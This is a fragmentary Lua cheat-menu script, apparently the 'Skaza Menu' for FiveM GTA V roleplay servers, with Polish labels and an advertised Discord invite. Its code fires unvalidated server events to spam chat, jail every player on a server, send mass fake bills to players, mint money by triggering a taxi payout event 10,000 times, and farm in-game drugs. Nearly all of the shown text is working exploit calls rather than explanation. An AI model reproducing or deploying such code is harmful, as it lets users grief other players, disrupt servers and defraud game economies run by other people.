...
function nukeserver()
    Citizen.CreateThread(function()
        ...
        for bs=0,9 do
            TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"Skaza DSC https://discord.gg/s6Fu6vv")
        end
    ...
    function()
        while true do
			...
			if chatspam then
                ...
                TriggerServerEvent('_chat:messageEntered', 'Skaza', {0, 0x99, 255}, 'Skaza Menu https://discord.gg/s6Fu6vv :P')
            end
			...
			if banallusers then
				...
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "Skaza Bejbe https://discord.gg/s6Fu6vv")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "Skaza Bejbe https://discord.gg/s6Fu6vv")
					end
				end
...
Citizen.CreateThread(
    function()
        ...
        Biznes.CreateMenu("MainMenu", "Skaza *NEW*")
        ...
        Biznes.CreateSubMenu("ESXEasy", "SerweryPL", "Opcje EasyLifeRP")
        ...
        local allMenus = { "MainMenu", "SelfMenu", "OnlinePlayersMenu", "SerweryPL", "WeaponMenu", "SingleWeaponMenu", "MaliciousMenu",
                            ...
                            "ESXMiscMenu", "ESXDrugMenu", "AI", "Credits", "VRPMenu", "DestroyServer", "ESXEasy"}


        while Enabled do
            if Biznes.IsMenuOpened("MainMenu") then
                drawNotification("~h~~b~Skaza ~s~Menu")
                drawNotification("~h~~s~Edytowane przez ~b~Skaza")
                if Biznes.MenuButton    ("~b~» ~s~Player ~r~Menu", "SelfMenu") then
				elseif Biznes.MenuButton("~b~» ~s~Online ~r~Players", "OnlinePlayersMenu") then
				elseif Biznes.MenuButton("~b~» ~s~World ~r~Menu", "MaliciousMenu") then
                elseif Biznes.MenuButton("~b~» ~s~Teleport ~r~Menu", "TeleportMenu") then             
                elseif Biznes.MenuButton("~b~» ~s~Weapon ~r~Menu", "WeaponMenu") then
                elseif Biznes.MenuButton("~b~» ~s~Vehicle ~r~Menu", "VehMenu") then
                elseif Biznes.MenuButton("~b~» ~s~Trolling ~r~Options", "TrollMenu") then
                elseif Biznes.MenuButton("~b~» ~g~CASH ~r~ESX", "ESXMenu") then
				elseif Biznes.MenuButton("~b~» ~s~Polskie~s~ ~r~Serwery", "SerweryPL") then
                elseif Biznes.MenuButton("~b~» ~s~VRP ~r~Options", "VRPMenu") then
				elseif Biznes.MenuButton("~b~» ~s~Funny", "AI") then 
            ...
            elseif Biznes.IsMenuOpened("TrollMenu") then
				...
				for i = 0, 128 do
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Skaza Menu https://discord.gg/s6Fu6vv", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Skaza Menu https://discord.gg/s6Fu6vv", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Skaza Menu https://discord.gg/s6Fu6vv", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Skaza Menu https://discord.gg/s6Fu6vv", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Skaza Menu https://discord.gg/s6Fu6vv", "6969696969")
    ...
    if not DoesEntityExist(veh) then
        drawNotification(
			...
			then
				...
				Biznes.Display()
			elseif Biznes.IsMenuOpened("SerweryPL") then
				if Biznes.MenuButton("EasyLifeRP", "ESXEasy") then
				end
				
				Biznes.Display()
			elseif Biznes.IsMenuOpened("ESXEasy") then
				if Biznes.Button("Zdrapka (x5)") then
                    TriggerServerEvent("tostzdrapkaplat:wygranko")
                    TriggerServerEvent("tostzdrapkaplat:wygranko")
                    TriggerServerEvent("tostzdrapkaplat:wygranko")
                    TriggerServerEvent("tostzdrapkaplat:wygranko")
                    TriggerServerEvent("tostzdrapkaplat:wygranko")
				elseif Biznes.Button("Kokaina (x5)") then
					TriggerServerEvent ('esx_drugs:startHarvestCokek', result)
					TriggerServerEvent ('esx_drugs:startHarvestCokek', result)
					TriggerServerEvent ('esx_drugs:startHarvestCokek', result)
					TriggerServerEvent ('esx_drugs:startHarvestCokek', result)
					TriggerServerEvent ('esx_drugs:startHarvestCokek', result)
				elseif Biznes.Button("Przerabianie Koki (x5)") then
					TriggerServerEvent ('esx_drugs:startTransformCokek', result)
					TriggerServerEvent ('esx_drugs:startTransformCokek', result)
					TriggerServerEvent ('esx_drugs:startTransformCokek', result)
					TriggerServerEvent ('esx_drugs:startTransformCokek', result)
					TriggerServerEvent ('esx_drugs:startTransformCokek', result)
				elseif Biznes.Button("Sprzedawanie Koki (x5)") then
					TriggerServerEvent ('esx_drugs:startSellCokek', result)
					TriggerServerEvent ('esx_drugs:startSellCokek', result)
					TriggerServerEvent ('esx_drugs:startSellCokek', result)
					TriggerServerEvent ('esx_drugs:startSellCokek', result)
					TriggerServerEvent ('esx_drugs:startSellCokek', result)
				elseif Biznes.Button("Sprzedawanie Koki (x5)") then
                    TriggerServerEvent("esx_drugs:stopHarvestCokek", result)
                    TriggerServerEvent("esx_drugs:stopTransformCokek", result)
                    TriggerServerEvent("esx_drugs:stopSellCokek", result)
                    TriggerServerEvent("esx_drugs:stopHarvestMethk", result)
                    TriggerServerEvent("esx_drugs:stopTransformMethk", result)
                    TriggerServerEvent("esx_drugs:stopSellMethk", result)
                    TriggerServerEvent("esx_drugs:stopHarvestWeedk", result)
                    TriggerServerEvent("esx_drugs:stopTransformWeedk", result)
                    TriggerServerEvent("esx_drugs:stopSellWeedk", result)
                    TriggerServerEvent("esx_drugs:stopHarvestOpiumk", result)
                    TriggerServerEvent("esx_drugs:stopTransformOpiumk", result)
                    TriggerServerEvent("esx_drugs:stopSellOpiumk", result)
			end
            ...
            elseif Biznes.IsMenuOpened("SelfMenu") then
                if Biznes.Button("Heal") then
                    SetEntityHealth(PlayerPedId(), 200)
                elseif Biznes.Button("Give Armor") then
                    SetPedArmour(PlayerPedId(), 200)
                elseif Biznes.Button("ESX Set Hunger/Thirst To 100%") then
				...
				elseif Biznes.Button("Taxijob ESX 10.000x") then
				a=1 repeat TriggerServerEvent('esx_taxijob:success') a=a+1 until (a>10000)
				elseif Biznes.Button("Give yourself money (VRP)") then
				TriggerServerEvent("dropOff", 100000)
				TriggerServerEvent('PayForRepairNow',-100000)
				drawNotification("Money deposited succesfully")
				elseif Biznes.Button("Give yourself 10x salary (VRP)") then
                ...
                elseif Biznes.Button("Revive") then
                    TriggerEvent("esx_ambulancejob:revive")
					TriggerEvent("ambulancier:selfRespawn")
				elseif Biznes.Button("~h~~b~Open Jail Menu ~g~ESX") then
                ...
                elseif Biznes.Button("Suicide") then
